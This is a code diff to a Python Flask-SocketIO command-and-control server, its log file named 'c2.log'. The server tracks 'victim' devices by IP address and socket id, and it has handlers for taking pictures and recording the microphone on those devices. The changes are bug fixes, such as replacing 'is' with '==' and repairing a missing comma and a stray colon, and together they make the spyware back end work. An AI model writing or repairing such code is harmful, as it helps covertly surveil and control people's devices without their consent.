@@ -33,10 +33,10 @@ socketio = SocketIO(app)
 
 def write_to_log_file(data):
     with open('c2.log', 'a') as f:
-        f.write(f"{data['device_id']}: {data['message']}")
+        f.write(f"{str(datetime.datetime.now().strftime('%d/%b/%Y %I:%M:%S %p'))} {data['device_id']}: {data['message']}")
 
 def log_to_console(data):
-    if data['status'] is 'success':
+    if data['status'] == 'success':
         emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'success']})
     else:
         emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'danger']})
@@ -44,7 +44,7 @@ def log_to_console(data):
 
 
 def update_database_and_log(value, data):
-    if data['status'] is 'success':
+    if data['status'] == 'success':
         try:
             con = sqlite3.connect("database.db")
             cur = con.cursor()
@@ -117,7 +117,7 @@ def value_changed(data):
             if record[0][3] != request.remote_addr:
                 cur.execute("UPDATE victim SET ipaddress=? WHERE deviceid=?", (request.remote_addr, data['device_id']))
                 con.commit()
-                emit("update victim ip", {'data' : [data['device_id'], 'light' request.remote_addr]})
+                emit("update victim ip", {'data' : [data['device_id'], 'light', request.remote_addr]})
             if record[0][6] != request.sid:
                 cur.execute("UPDATE victim SET socketid=? WHERE deviceid=?", (request.sid, data['device_id']))
                 con.commit()
@@ -195,7 +195,7 @@ def take_picture_listener(data):
 
 @socketio.on('0xA')
 def record_mic_listener(data):
-    write_bytes_and_log(data):
+    write_bytes_and_log(data)
 
 
 @socketio.on('0xB')
